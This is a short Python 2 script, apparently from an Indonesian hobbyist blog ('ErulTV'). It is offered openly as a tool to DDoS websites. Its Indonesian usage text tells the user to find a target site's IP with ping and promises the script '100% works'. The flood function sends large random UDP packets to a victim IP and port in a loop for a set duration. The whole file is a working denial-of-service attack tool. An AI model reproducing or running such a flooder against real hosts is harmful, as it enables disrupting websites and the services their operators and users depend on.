import sys
import random
import time
import socket
import os

# By ErulTV
# Subscribe ErulTV
# Versi 1.0
# https://erultv.blogspot.com

os.system("clear");
def usage():
	print("""\033[92m
https://erultv.blogspot.com
____________________________________________________
| Yang Anda Masukan Salah.                         |
|__________________________________________________|
| Untuk Ddos Sebuah Web Anda Harus Menemukan Ip    |
| Website Target, Cara nya mudah Anda Tinggal beri.|
| $ ping <url_web>                                 |
|                                                  |
| untuk Menjalankan script ini Code nya seperti di |
| bawah ini bro, 100% berjalan.                    |
| python2 <ip> <port> <paket>                      |
____________________________________________________
	""");

def flood(victim, vport, duration):
	client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
	bytes = random._urandom(20000);
	timeout = time.time() + duration;
		
	sent = 3000;
	
	while 1:
		if time.time() > timeout:
			break
		else:
			pass
		client.sendto(bytes, (victim, vport));
		sent = sent + 1;
		print "\033[1;92mPaket \033[1;93m%s \033[1;92mIp Website \033[1;93m%s \033[1;92mPort \033[1;93m%s"%(sent, victim, vport);
	
def main():
	print len(sys.argv);
	if len(sys.argv) !=4:
		usage();
	else:
		flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]));

if __name__ == "__main__":
	main();